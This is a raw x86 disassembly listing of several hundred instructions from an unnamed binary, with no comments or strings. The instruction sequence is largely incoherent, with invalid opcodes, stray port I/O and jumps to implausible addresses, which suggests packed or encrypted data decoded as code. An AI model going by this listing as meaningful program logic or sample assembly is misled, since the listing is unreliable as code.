  417306:	inc    ebx
  417307:	mov    edx,0x5a353d31
  41730c:	repnz es lock pop eax
  417310:	mov    esi,0xb9fadb7e
  417315:	clc    
  417316:	ins    BYTE PTR es:[edi],dx
  417317:	push   es
  417318:	ret    0x5bc5
  41731b:	mov    esi,0x37cc1ee8
  417320:	dec    esp
  417321:	jmp    0x4fda37d4
  417326:	out    0x58,al
  417328:	rol    ecx,1
  41732a:	jne    0x41734b
  41732c:	cmp    edx,edi
  41732e:	add    al,0xd5
  417330:	xor    ebp,DWORD PTR [edx-0x33]
  417333:	scas   eax,DWORD PTR es:[edi]
  417334:	imul   edi,esi,0xffffffdd
  417337:	rcl    BYTE PTR [eax+edi*1],cl
  41733a:	dec    edi
  41733b:	jmp    0x41738a
  41733d:	lods   al,BYTE PTR ds:[esi]
  41733e:	in     eax,0xbd
  417340:	jl     0x4172e8
  417342:	dec    edi
  417343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417344:	mov    cl,0x5a
  417346:	fyl2x  
  417348:	push   ds
  417349:	ss hlt 
  41734b:	enter  0x69f4,0xac
  41734f:	xlat   BYTE PTR ds:[ebx]
  417350:	ret    
  417351:	bound  edi,QWORD PTR [eax+0x2d549079]
  417357:	mov    eax,ds:0xeee923f6
  41735c:	mov    al,ds:0xa080e198
  417361:	jmp    0x1888e9f8
  417366:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417368:	loope  0x4172f1
  41736a:	jge    0x4173bc
  41736c:	cmc    
  41736d:	sbb    ecx,DWORD PTR [esi]
  41736f:	imul   ch
  417371:	lds    esi,FWORD PTR [esi]
  417373:	loop   0x4173be
  417375:	adc    dl,ah
  417377:	cmp    al,0x82
  417379:	test   DWORD PTR [edi-0x6a],ebx
  41737c:	outs   dx,BYTE PTR ds:[esi]
  41737d:	(bad)  
  41737e:	fnstenv [ecx-0xb36215d]
  417384:	imul   edx,DWORD PTR [ebp-0x39141565],0xaa424cd0
  41738e:	pop    ecx
  41738f:	jge    0x417391
  417391:	jge    0x4173d9
  417393:	mov    ebp,0x3daf3901
  417398:	sub    bl,BYTE PTR [eax-0x15b2d2c4]
  41739e:	lods   al,BYTE PTR ds:[esi]
  41739f:	in     eax,dx
  4173a0:	outs   dx,DWORD PTR ds:[esi]
  4173a1:	mov    esp,0x76af612f
  4173a6:	mov    al,ds:0x4ae86813
  4173ab:	inc    eax
  4173ac:	xchg   cl,bh
  4173ae:	mov    dl,0xe5
  4173b0:	jno    0x417407
  4173b2:	inc    ecx
  4173b3:	push   0x405e2b4f
  4173b8:	push   0x36
  4173ba:	xchg   ebp,eax
  4173bb:	cwde   
  4173bc:	mov    cl,0x74
  4173be:	cmp    esp,edi
  4173c0:	xchg   ecx,eax
  4173c1:	loop   0x4173e1
  4173c3:	sbb    al,0x8b
  4173c5:	cmp    eax,0x4cc8ae5a
  4173ca:	outs   dx,DWORD PTR fs:[esi]
  4173cc:	push   es
  4173cd:	mov    esi,0xa703fdea
  4173d2:	adc    al,0x7d
  4173d4:	xchg   edx,eax
  4173d5:	and    ebp,ebx
  4173d7:	mov    ebp,0x7efbcd4c
  4173dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173dd:	inc    ebp
  4173de:	push   edx
  4173df:	cmp    ecx,DWORD PTR [esi-0x7c9b7b19]
  4173e5:	and    ebp,esp
  4173e7:	cwde   
  4173e8:	push   es
  4173e9:	add    cl,BYTE PTR [eax+0x60]
  4173ec:	jge    0x417384
  4173ee:	jp     0x4173fe
  4173f0:	imul   DWORD PTR [edx-0x16]
  4173f3:	push   edi
  4173f4:	mov    dh,0xd7
  4173f6:	add    esp,esp
  4173f8:	sbb    eax,0xcc2b5400
  4173fd:	xchg   ebx,eax
  4173fe:	pop    ecx
  4173ff:	xchg   DWORD PTR [edi-0x24865dfd],esi
  417405:	adc    eax,DWORD PTR [esi+0x1eef8172]
  41740b:	cwde   
  41740c:	sbb    DWORD PTR [eax],esp
  41740e:	cld    
  41740f:	sub    eax,ebx
  417411:	pop    ecx
  417412:	js     0x417418
  417414:	fstp   TBYTE PTR [esi-0x7930e0c8]
  41741a:	je     0x417470
  41741c:	sar    DWORD PTR [ebx+ebx*2-0x2662f492],0x4e
  417424:	inc    esi
  417425:	cmp    BYTE PTR [edx+0x21],cl
  417428:	sbb    eax,0x6f6baabb
  41742d:	cwde   
  41742e:	jnp    0x41740f
  417430:	xchg   edx,eax
  417431:	cmp    eax,0xedc5b4c0
  417436:	fisubr WORD PTR ds:0xb815b361
  41743c:	dec    eax
  41743d:	or     DWORD PTR [ecx+0x6],eax
  417440:	loop   0x417416
  417442:	out    dx,eax
  417443:	xor    ah,BYTE PTR [ebx+0x2b]
  417446:	loop   0x417459
  417448:	faddp  st(6),st
  41744a:	out    dx,eax
  41744b:	outs   dx,DWORD PTR ds:[esi]
  41744c:	dec    esi
  41744d:	lock addr16 fwait
  417450:	mov    bh,0x95
  417452:	add    eax,0xaf63b60e
  417457:	out    dx,al
  417458:	rol    BYTE PTR [edi+0x2b],0x52
  41745c:	push   ecx
  41745d:	call   0x41dfb1
  417462:	mov    eax,DWORD PTR [esi]
  417464:	mov    ecx,DWORD PTR [esi+0x4]
  417467:	shrd   eax,ecx,0x2
  41746b:	shr    ecx,0x2
  41746e:	shr    edx,0x1e
  417471:	xor    ecx,0xe702a276
  417477:	jmp    0x417a01
  41747c:	repnz fadd DWORD PTR [eax-0xd9b9f7c]
  417483:	pop    eax
  417484:	loop   0x417458
  417486:	fsubr  DWORD PTR [eax-0x57fa747f]
  41748c:	fimul  WORD PTR [edi+0x43d160c]
  417492:	push   ss
  417493:	push   ss
  417494:	mov    al,0xe8
  417496:	xor    BYTE PTR ds:0x82ab3fa8,dl
  41749c:	lahf   
  41749d:	in     eax,dx
  41749e:	add    al,0x63
  4174a0:	dec    esp
  4174a1:	cmp    al,0x93
  4174a3:	or     BYTE PTR [esi+0x75c3d333],0xd4
  4174aa:	in     al,dx
  4174ab:	rcl    DWORD PTR [ecx-0x71],1
  4174ae:	inc    eax
  4174af:	dec    esi
  4174b0:	mov    bl,0xe3
  4174b2:	push   eax
  4174b3:	inc    ecx
  4174b4:	and    al,0x7
  4174b6:	loopne 0x4174f3
  4174b8:	ret    
  4174b9:	push   ds
  4174ba:	dec    ecx
  4174bb:	inc    edi
  4174bc:	rcl    BYTE PTR [esi-0x12],1
  4174bf:	pop    esi
  4174c0:	jmp    0x41752d
  4174c2:	jnp    0x417515
  4174c4:	lds    esp,FWORD PTR [edx-0x637a7373]
  4174ca:	sahf   
  4174cb:	outs   dx,DWORD PTR ds:[esi]
  4174cc:	mov    edi,DWORD PTR [esi+edx*4]
  4174cf:	jmp    0xb0d3:0x90180b2
  4174d6:	cmp    eax,0x4d4c6bb3
  4174db:	scas   al,BYTE PTR es:[edi]
  4174dc:	pop    ecx
  4174dd:	xchg   edx,eax
  4174de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174df:	call   0xc0048d8e
  4174e4:	jp     0x417475
  4174e6:	mov    eax,DWORD PTR [ebx]
  4174e8:	das    
  4174e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174ea:	jmp    0x9955:0xc0ff2dd0
  4174f1:	adc    cl,BYTE PTR [esi-0x7ff71a33]
  4174f7:	loopne 0x417564
  4174f9:	dec    edi
  4174fa:	sbb    eax,0xada2e2e2
  4174ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417500:	sub    eax,edx
  417502:	pop    eax
  417503:	sub    al,0xbf
  417505:	cwde   
  417506:	and    DWORD PTR [ecx-0x6c],ebx
  417509:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750a:	adc    al,0x4c
  41750c:	imul   esi,ebp,0x3396c7ef
  417512:	loope  0x4174a4
  417514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417515:	repnz fidiv DWORD PTR [ecx+0x7d462712]
  41751c:	sti    
  41751d:	call   0x6445e772
  417522:	cmp    dh,dl
  417524:	jp     0x41758f
  417526:	scas   al,BYTE PTR es:[edi]
  417527:	in     eax,dx
  417528:	sbb    eax,DWORD PTR [edi+0x1cc0376c]
  41752e:	push   es
  41752f:	js     0x41757f
  417531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417532:	(bad)  
  417533:	sbb    al,0x1d
  417535:	jne    0x417559
  417537:	xchg   esp,eax
  417538:	push   eax
  417539:	aad    0x83
  41753b:	xor    DWORD PTR [edx],0xffffffa4
  41753e:	rcr    DWORD PTR [edx],cl
  417540:	mov    cs,WORD PTR [ebx]
  417542:	xor    eax,0x2052ee78
  417547:	adc    eax,0x8cda5d43
  41754c:	hlt    
  41754d:	stc    
  41754e:	sbb    BYTE PTR ds:0x9e94d664,bh
  417554:	outs   dx,BYTE PTR ds:[esi]
  417555:	fdivr  DWORD PTR [edx+0x5c]
  417558:	jb     0x41758d
  41755a:	mov    cl,0x52
  41755c:	rcr    DWORD PTR [edi+0x1f],1
  41755f:	and    eax,0x47e9530a
  417564:	pusha  
  417565:	mov    ds:0x8648b03d,al
  41756a:	mov    WORD PTR [eax-0x45],?
  41756d:	push   eax
  41756e:	(bad)  
  417570:	cmc    
  417571:	iret   
  417572:	and    edx,DWORD PTR [ebx+0x0]
  417575:	adc    dl,dl
  417577:	cmp    ecx,DWORD PTR [esi+0x9d04d1b]
  41757d:	add    edi,DWORD PTR [ebp-0x46]
  417580:	sub    eax,0x874b5a93
  417585:	pushf  
  417586:	addr16 mov ah,0xbc
  417589:	and    esi,eax
  41758b:	icebp  
  41758c:	(bad)  
  41758d:	lea    edi,[ebp-0x31]
  417590:	in     al,dx
  417591:	add    ebx,DWORD PTR [ecx]
  417593:	inc    ebp
  417594:	dec    edx
  417595:	(bad)  
  417596:	pusha  
  417597:	mov    ebx,DWORD PTR [edx-0x666085d3]
  41759d:	out    0x3c,eax
  41759f:	jle    0x41758f
  4175a1:	repz addr16 das 
  4175a4:	jp     0x4175c1
  4175a6:	cmp    dh,BYTE PTR [ecx+0x19ad760d]
  4175ac:	es sbb eax,0xec3d5ca0
  4175b2:	push   ds
  4175b3:	push   edi
  4175b4:	shl    BYTE PTR [ebp+0x52],1
  4175b7:	rcr    BYTE PTR ss:[edi],0x15
  4175bb:	dec    edi
  4175bc:	imul   ebp,DWORD PTR [ebp-0x5e3b34d1],0xfc889f5
  4175c6:	test   DWORD PTR [edi],0x953dd788
  4175cc:	loopne 0x417556
  4175ce:	pop    esp
  4175cf:	ins    BYTE PTR es:[edi],dx
  4175d0:	call   0x582a4479
  4175d5:	xor    ecx,eax
  4175d7:	int    0xca
  4175d9:	cmp    eax,0xfca6894b
  4175de:	shr    DWORD PTR [ebp+0x27232aea],1
  4175e4:	ins    BYTE PTR es:[edi],dx
  4175e5:	shl    BYTE PTR [ecx+0x4490d896],1
  4175eb:	(bad)  
  4175ec:	mov    edi,0x3f23b283
  4175f1:	xlat   BYTE PTR ds:[ebx]
  4175f2:	add    ebp,DWORD PTR [eax-0x1d3afa85]
  4175f8:	pop    ebp
  4175f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175fa:	adc    al,0x94
  4175fc:	jg     0x4175dd
  4175fe:	pop    edi
  4175ff:	jno    0x417611
  417601:	jbe    0x417662
  417603:	jecxz  0x4175e4
  417605:	pop    edx
  417606:	adc    ebp,DWORD PTR [esi+0x28]
  417609:	jle    0x417610
  41760b:	inc    edi
  41760c:	ins    DWORD PTR es:[edi],dx
  41760d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41760e:	enter  0xe130,0x2f
  417612:	push   edi
  417613:	nop
  417614:	sti    
  417615:	sub    edx,DWORD PTR [ebp+edx*4+0x78]
  417619:	aaa    
  41761a:	push   es
  41761b:	loopne 0x417647
  41761d:	jb     0x417625
  41761f:	ret    0x1a60
  417622:	shl    BYTE PTR [ebx],0x44
  417625:	mov    al,0xd2
  417627:	inc    ebp
  417628:	mov    edi,0xc0114af
  41762d:	popf   
  41762e:	add    al,0x5f
  417630:	jg     0x41762a
  417632:	push   edi
  417633:	test   ecx,edi
  417635:	into   
  417636:	dec    edi
  417637:	(bad)  
  417638:	iret   
  417639:	push   0xf
  41763b:	call   0x9f7bf94b
  417640:	mov    edx,0x4030342f
  417645:	and    ch,BYTE PTR [ebp+0x34]
  417648:	dec    edx
  417649:	pop    ds
  41764a:	leave  
  41764b:	jno    0x41762b
  41764d:	out    0xe0,al
  41764f:	jmp    0x346515af
  417654:	jb     0x417608
  417656:	rol    esi,1
  417658:	mov    ecx,0x40d1440c
  41765d:	xchg   BYTE PTR [edi+eiz*1],al
  417660:	push   esp
  417661:	jmp    0x214f4c37
  417666:	sbb    ecx,edx
  417668:	push   0x5c9f84be
  41766d:	xor    eax,0xe9f6a0ab
  417672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417673:	mov    eax,0xc4902c1b
  417678:	out    dx,eax
  417679:	dec    ebp
  41767a:	fadd   QWORD PTR [edi+ecx*4-0x67484127]
  417681:	jl     0x41760a
  417683:	inc    edi
  417684:	fsub   DWORD PTR [di-0xa]
  417688:	pop    edi
  417689:	repz pushf 
  41768b:	dec    ebx
  41768c:	inc    edi
  41768d:	icebp  
  41768e:	inc    esp
  41768f:	sub    bh,cl
  417691:	das    
  417692:	aaa    
  417693:	mov    ah,0x17
  417695:	aad    0xcc
  417697:	push   esi
  417698:	lods   al,BYTE PTR ds:[esi]
  417699:	adc    DWORD PTR [ecx],0xf94b45bf
  41769f:	sub    al,0x66
  4176a1:	jmp    0x41768d
  4176a3:	jp     0x4176be
  4176a5:	call   0x55197fb5
  4176aa:	jne    0x417701
  4176ac:	sub    BYTE PTR [esi-0x73c10d07],0x45
  4176b3:	push   cs
  4176b4:	xchg   edi,eax
  4176b5:	push   esi
  4176b6:	test   BYTE PTR [eax-0x265d95f6],0xc6
  4176bd:	xor    al,0xaa
  4176bf:	xchg   ebx,eax
  4176c0:	lock mov dh,0x54
  4176c3:	or     eax,0x435d8c3c
  4176c8:	(bad)  
  4176c9:	pop    esi
  4176ca:	retf   0xd48a
  4176cd:	push   esi
  4176ce:	aas    
  4176cf:	dec    eax
  4176d0:	mov    fs,WORD PTR [ecx-0x2d]
  4176d3:	sub    eax,0xade68d27
  4176d8:	mov    esp,0xd1a2f3e8
  4176dd:	ins    BYTE PTR es:[edi],dx
  4176de:	mov    bh,0x9b
  4176e0:	popa   
  4176e1:	mov    DWORD PTR [edx],ecx
  4176e3:	(bad)
  4176e6:	mov    ch,0x8
  4176e8:	add    DWORD PTR [ecx-0x16c14662],esp
  4176ee:	add    eax,0x8b478257
  4176f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176f4:	xor    edx,DWORD PTR [ecx+0x62ad125c]
  4176fa:	sub    al,dl
  4176fc:	inc    ecx
  4176fd:	call   0x4cd04239
  417702:	out    dx,eax
  417703:	bound  esp,QWORD PTR ds:0xa1627a7e
  417709:	rcl    BYTE PTR [eax-0x6b3aa0c3],0xb1
  417710:	sub    al,0x3c
  417712:	call   0x3f2da6b2
  417717:	mov    esp,0x6b651f27
  41771c:	sub    esp,esp
  41771e:	push   0xffffffa5
  417720:	dec    ecx
  417721:	add    eax,esi
  417723:	push   ss
  417724:	xchg   ebx,eax
  417725:	daa    
  417726:	or     al,0x61
  417728:	dec    esi
  417729:	dec    eax
  41772a:	jo     0x417723
  41772c:	sub    BYTE PTR [eax+0x4],al
  41772f:	sub    ecx,edi
  417731:	pop    ecx
  417732:	add    DWORD PTR [edx+edi*4],ecx
  417735:	test   eax,0x8d135e8a
  41773a:	sti    
  41773b:	inc    edi
  41773c:	cli    
  41773d:	ja     0x417713
  41773f:	pop    eax
  417740:	fdiv   DWORD PTR [edx]
  417742:	and    al,ah
  417744:	fs ret 
  417746:	hlt    
  417747:	std    
  417748:	cld    
  417749:	jp     0x4177b6
  41774b:	int3   
  41774c:	stc    
  41774d:	rcl    cl,cl
  41774f:	out    dx,eax
  417750:	call   0xbbb9:0x17ab7f62
  417757:	pop    es
  417758:	jl     0x4176dc
  41775a:	xchg   edi,eax
  41775b:	mov    DWORD PTR [eax],edi
  41775d:	dec    esp
  41775e:	lea    esp,[edx+ebp*2]
  417761:	mov    BYTE PTR [edi+0x6cf37555],ch
  417767:	rcl    DWORD PTR [ebx+0x54],cl
  41776a:	into   
  41776b:	jp     0x4177c3
  41776d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41776e:	cmp    al,cl
  417770:	mov    ch,0x8a
  417772:	(bad)  [esi+0x5b]
  417775:	loopne 0x4177ec
  417777:	fiadd  WORD PTR [ebp-0x15127180]
  41777d:	addr16 dec edx
  41777f:	and    ebp,eax
  417781:	and    ch,dh
  417783:	pop    ds
  417784:	scas   al,BYTE PTR es:[edi]
  417785:	retf   0x8493
  417788:	pop    ds
  417789:	int    0x3a
  41778b:	xor    eax,eax
  41778d:	inc    edi
  41778e:	mov    edi,0x75c785d2
  417793:	repz sar BYTE PTR [esi],1
  417796:	add    eax,ecx
  417798:	imul   esp,ecx,0x7b816ed4
  41779e:	sbb    al,0x48
  4177a0:	mov    esp,0x16023f71
  4177a5:	dec    edx
  4177a6:	popa   
  4177a7:	nop
  4177a8:	or     DWORD PTR [ecx+0x77c50398],ecx
  4177ae:	and    cl,dh
  4177b0:	mov    ebx,0xae6da39a
  4177b5:	outs   dx,DWORD PTR ds:[esi]
  4177b6:	pushf  
  4177b7:	leave  
  4177b8:	push   ebx
  4177b9:	add    dl,dl
  4177bb:	add    eax,ebp
  4177bd:	ror    DWORD PTR [esi-0x77],0x56
  4177c1:	enter  0x7a24,0xd4
  4177c5:	(bad)  
  4177c6:	popa   
  4177c7:	dec    ecx
  4177c8:	pop    ecx
  4177c9:	inc    esi
  4177ca:	(bad)  
  4177cb:	sub    ebx,ecx
  4177cd:	shl    bl,1
  4177cf:	sub    eax,0xb796c9bc
  4177d4:	test   al,0x8f
  4177d6:	adc    al,0xd
  4177d8:	cmp    ecx,DWORD PTR [esi-0x12587644]
  4177de:	cmp    ebp,DWORD PTR [esi+eax*4]
  4177e1:	test   al,ch
  4177e3:	sub    al,BYTE PTR [edi+0x1dd1395a]
  4177e9:	sbb    bh,BYTE PTR [eax+0x6f1ad80c]
  4177ef:	inc    eax
  4177f0:	fist   DWORD PTR [ebx]
  4177f2:	push   ecx
  4177f3:	jecxz  0x4177c2
  4177f5:	outs   dx,BYTE PTR ds:[esi]
  4177f6:	cli    
  4177f7:	cdq    
  4177f8:	pop    ds
  4177f9:	shr    DWORD PTR [esi+ebx*8+0x4ed2b082],cl
  417800:	jno    0x4177b9
  417802:	call   0x1fa10f03
  417807:	push   es
  417808:	jge    0x417805
  41780a:	push   ecx
  41780b:	fcmovu st,st(5)
  41780d:	addr16 sub ah,ah
  417810:	mov    edx,?
  417812:	xlat   BYTE PTR ds:[ebx]
  417813:	mov    dl,bl
  417815:	sbb    eax,0xd8e786ea
  41781a:	shr    DWORD PTR [ebx-0x70],cl
  41781d:	in     al,0xa9
  41781f:	and    DWORD PTR [eax-0x2a],edi
  417822:	add    al,0xf3
  417824:	dec    ebx
  417825:	push   ecx
  417826:	or     al,0x4f
  417828:	fadd   DWORD PTR [esi-0x339ad67]
  41782e:	cli    
  41782f:	cmp    DWORD PTR [edi-0x5d],ecx
  417832:	xlat   BYTE PTR ds:[ebx]
  417833:	push   ebx
  417834:	push   edx
  417835:	out    0xd2,al
  417837:	add    ch,BYTE PTR [edx]
  417839:	push   ebp
  41783a:	sbb    edx,DWORD PTR [edx]
  41783c:	(bad)  
  41783d:	idiv   BYTE PTR [ebx-0x6976902f]
  417843:	stos   BYTE PTR es:[edi],al
  417844:	jo     0x41789c
  417846:	sbb    eax,DWORD PTR ds:[ecx-0x32]
  41784a:	les    esp,FWORD PTR [edi-0x2]
  41784d:	pop    es
  41784e:	gs test eax,0xd83c837d
  417854:	inc    ecx
  417855:	pop    ebx
  417856:	push   es
  417857:	add    edx,edi
  417859:	stos   DWORD PTR es:[edi],eax
  41785a:	add    cl,BYTE PTR [esi+0x5]
  41785d:	(bad)  
  41785f:	sub    edx,ebp
  417861:	xchg   esp,eax
  417862:	push   edx
  417863:	push   edx
  417864:	nop
  417865:	lock adc al,BYTE PTR [ecx+0x775ea9fa]
  41786c:	inc    esi
  41786d:	loop   0x4178b9
  41786f:	add    al,0xce
  417871:	xchg   ebx,eax
  417872:	nop
  417873:	inc    esp
  417874:	cdq    
  417875:	rep stos DWORD PTR es:[edi],eax
  417877:	js     0x417860
  417879:	pop    edx
  41787a:	inc    esi
  41787b:	cmp    BYTE PTR [edx-0x5484dadf],bl
  417881:	push   edx
  417882:	sub    ch,BYTE PTR [ecx-0x2b]
  417885:	and    DWORD PTR ds:0x7f933d25,ecx
  41788b:	mov    al,ds:0x52a60ea1
  417890:	push   es
  417891:	out    dx,eax
  417892:	mov    dh,0xa
  417894:	imul   ebp,DWORD PTR [ecx],0x30411dd3
  41789a:	arpl   WORD PTR [eax+0x183bf882],cx
  4178a0:	mov    DWORD PTR [ebx+ecx*2+0x24],edx
  4178a4:	dec    esp
  4178a5:	xor    DWORD PTR [edi-0xa635bb1],ebp
  4178ab:	call   0x9e7b:0xb59335f7
  4178b2:	sub    edx,DWORD PTR [ecx]
  4178b4:	push   esp
  4178b5:	mov    ah,0x71
  4178b7:	test   eax,0xa03d476a
  4178bc:	jbe    0x4178bd
  4178be:	inc    ecx
  4178bf:	fdivr  DWORD PTR [ecx]
  4178c1:	adc    eax,0x5c6a3d39
  4178c6:	mov    esp,0x4bba7c19
  4178cb:	or     BYTE PTR [ecx+ecx*2+0x115d4a92],al
  4178d2:	pop    eax
  4178d3:	mov    cl,0xbd
  4178d5:	pmaxsw mm7,QWORD PTR [edi]
  4178d8:	int3   
  4178d9:	(bad)  
  4178da:	jno    0x417878
  4178dc:	jmp    0x71de:0xacc5c8ac
  4178e3:	mov    ah,0x1d
  4178e5:	push   ds
  4178e6:	hlt    
  4178e7:	push   ds
  4178e8:	ror    DWORD PTR [ebx-0x4981566e],1
  4178ee:	mov    cl,al
  4178f0:	jns    0x41796c
  4178f2:	addr16 sbb al,0xfc
  4178f5:	(bad)  
  4178f6:	aad    0xc
  4178f8:	fstp   TBYTE PTR [ebx-0x4a5a12e7]
  4178fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ff:	xchg   ebp,ebp
  417901:	xchg   ebp,eax
  417902:	xchg   DWORD PTR [edx+0x7],eax
  417905:	(bad)  
  417906:	retf   
  417907:	sbb    eax,0xcad87730
  41790c:	xchg   edx,eax
  41790d:	aad    0xb2
  41790f:	sub    DWORD PTR [edx-0x1],ebp
  417912:	and    al,0x70
  417914:	popf   
  417915:	and    bh,bh
  417917:	push   0xffffffc0
  417919:	dec    ecx
  41791a:	pop    edi
  41791b:	test   eax,0xaae54786
  417920:	add    edi,DWORD PTR [esi+0xb]
  417923:	xor    ch,BYTE PTR [esi+0x59e75513]
  417929:	dec    edi
  41792a:	adc    ah,dl
  41792c:	jbe    0x4178d9
  41792e:	in     eax,dx
  41792f:	mov    WORD PTR [ecx+0x73],fs
  417932:	lods   al,BYTE PTR ds:[esi]
  417933:	shr    DWORD PTR [esi],0x89
  417936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417937:	sbb    eax,edx
  417939:	mov    ecx,0xdb3f20bd
  41793e:	sub    bh,dh
  417940:	push   ds
  417941:	add    dl,dl
  417943:	push   edx
  417944:	mov    WORD PTR [eax+0x1a4a68a9],?
  41794a:	out    0x3,al
  41794c:	fidiv  WORD PTR [ebx-0x64d1676a]
  417952:	adc    al,0x3
  417954:	aas    
  417955:	xor    ebx,DWORD PTR [ecx-0x3c]
  417958:	dec    DWORD PTR [edi]
  41795a:	rcl    WORD PTR [ebx-0x31bf4ff4],cl
  417961:	sub    ebx,esi
  417963:	jne    0x417942
  417965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417966:	test   eax,0xa6dacd18
  41796b:	fucomi st,st(3)
  41796d:	jnp    0x417964
  41796f:	mov    ch,BYTE PTR [esi+esi*4+0x2a7abaa2]
  417976:	fisttp DWORD PTR [edx]
  417978:	jle    0x4179e8
  41797a:	xchg   cl,cl
  41797c:	mov    eax,esp
  41797e:	jge    0x417912
  417980:	in     eax,dx
  417981:	adc    eax,0x5872d8f5
  417986:	jbe    0x417996
  417988:	sub    esi,esp
  41798a:	data16 mov ah,0x55
  41798d:	inc    BYTE PTR ds:0x1a1707db
  417993:	call   0xe36:0x8402bd9
  41799a:	fwait
  41799b:	add    al,0xe
  41799d:	mov    esp,0x144eb2
  4179a2:	mov    eax,edi
  4179a4:	inc    esi
  4179a5:	or     eax,DWORD PTR [eax-0x66]
  4179a8:	sub    al,0x51
  4179aa:	push   edx
  4179ab:	mov    DWORD PTR [edx],edx
  4179ad:	in     al,dx
  4179ae:	(bad)  
  4179af:	ror    ebx,cl
  4179b1:	jno    0x417a30
  4179b3:	(bad)  
  4179b4:	bound  esp,QWORD PTR [edi-0x13]
  4179b7:	add    BYTE PTR [ecx],0xe6
  4179ba:	push   ecx
  4179bb:	pop    es
  4179bc:	lock arpl ax,dx
  4179bf:	adc    bh,BYTE PTR [ebx]
  4179c1:	fsubr  DWORD PTR [edx+0x1b6876ce]
  4179c7:	dec    ebp
  4179c8:	mov    esp,0xd6330511
  4179cd:	add    dl,al
  4179cf:	dec    esi
  4179d0:	in     eax,0xe7
  4179d2:	push   esp
  4179d3:	push   ecx
  4179d4:	dec    ebp
  4179d5:	jp     0x417a2e
  4179d7:	ss push es
  4179d9:	ror    BYTE PTR fs:[esi-0x74],cl
  4179dd:	push   es
  4179de:	pushf  
  4179df:	mov    DWORD PTR [esi],ecx
  4179e1:	sar    esp,0xe6
  4179e4:	(bad)  
  4179e5:	out    dx,eax
  4179e6:	out    0x54,al
  4179e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179e9:	cmp    dl,BYTE PTR [eax+esi*4-0x77]
  4179ed:	(bad)  
  4179ee:	into   
  4179ef:	retf   
  4179f0:	fcom   QWORD PTR [edi]
  4179f3:	jg     0x41799c
  4179f5:	in     eax,dx
  4179f6:	retf   
  4179f7:	mov    ch,0xe4
  4179f9:	push   es
  4179fa:	xor    ah,BYTE PTR ds:0x206cb39
  417a00:	retf   
  417a01:	push   ecx
  417a02:	xor    eax,edi
  417a04:	mov    DWORD PTR [ebp+0x10],edx
  417a07:	mov    edx,DWORD PTR [ebx]
  417a09:	jmp    0x417f93
  417a0e:	in     al,dx
  417a0f:	and    cl,BYTE PTR [esi-0x3d]
  417a12:	dec    eax
  417a13:	mov    ds:0xcc442870,eax
  417a18:	xor    BYTE PTR [edx+0x683e9ab9],0x4
  417a1f:	jnp    0x417a2d
  417a21:	push   ss
  417a22:	cmp    eax,0xcb161604
  417a27:	and    ebp,DWORD PTR [edi+0x1e]
  417a2a:	add    DWORD PTR [edi],edx
  417a2c:	sbb    edi,DWORD PTR [eax-0xc]
  417a2f:	mov    dh,BYTE PTR [ecx+ebp*8-0x8]
  417a33:	fild   WORD PTR [esi]
  417a35:	inc    esi
  417a36:	bound  edi,QWORD PTR [edx]
  417a38:	into   
  417a39:	imul   ebx,DWORD PTR [edx],0xd09f556d
  417a3f:	xchg   ecx,eax
  417a40:	(bad)
  417a44:	pop    edi
  417a45:	jmp    0x417a2e
  417a47:	adc    ebx,DWORD PTR [edi+0x65]
  417a4a:	and    al,0x9e
  417a4c:	call   0x5cbefee1
  417a51:	xlat   BYTE PTR ds:[ebx]
  417a53:	mov    eax,0x5915c557
  417a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a59:	scas   al,BYTE PTR es:[edi]
  417a5a:	inc    eax
  417a5b:	mov    eax,ds:0x2f32541c
  417a60:	cld    
  417a61:	add    esi,esp
  417a63:	leave  
  417a64:	adc    eax,0x92fda0a9
  417a69:	mov    ecx,0xc12a0bbe
  417a6e:	call   0xd5369d8b
  417a73:	add    eax,0xe62868d9
  417a78:	pop    eax
  417a79:	adc    eax,DWORD PTR cs:[ecx-0x2a]
  417a7d:	(bad)  
  417a7e:	jb     0x417a93
  417a80:	(bad)  
  417a81:	push   fs
  417a83:	push   ecx
  417a84:	sub    dh,BYTE PTR [eax+edi*4-0x3c]
  417a88:	ficom  WORD PTR [eax]
  417a8a:	mov    esi,0x997d8058
  417a8f:	add    al,cl
  417a91:	loopne 0x417b0c
  417a93:	pushf  
  417a94:	or     ah,BYTE PTR [ebx]
  417a96:	xchg   DWORD PTR [ebp+0x3f],ecx
  417a99:	pushf  
  417a9a:	dec    ebp
  417a9b:	adc    BYTE PTR [edi+0x3e],0xc9
  417a9f:	cmp    dh,BYTE PTR [eax+eax*1]
  417aa2:	fsubp  st(0),st
  417aa4:	in     al,0x94
  417aa6:	int3   
  417aa7:	and    ebp,DWORD PTR [ecx]
  417aa9:	mov    BYTE PTR [edx],0x69
  417aac:	inc    ebx
  417aad:	inc    esi
  417aae:	jns    0x417af2
  417ab0:	jmp    DWORD PTR [edi+edi*8-0x25]
  417ab4:	jne    0x417a9b
  417ab6:	xor    al,0x1f
  417ab8:	sbb    BYTE PTR [ebp+0x11],bl
  417abb:	bound  eax,QWORD PTR [ecx+esi*4-0x2a]
  417abf:	pushf  
  417ac0:	stos   DWORD PTR es:[edi],eax
  417ac1:	aam    0xa5
  417ac3:	fidiv  DWORD PTR [esi-0x55]
  417ac6:	jp     0x417aec
  417ac8:	jns    0x417ab6
  417aca:	loopne 0x417a9c
  417acc:	xchg   esi,eax
  417acd:	fdiv   QWORD PTR [ecx+0x1a58b0d4]
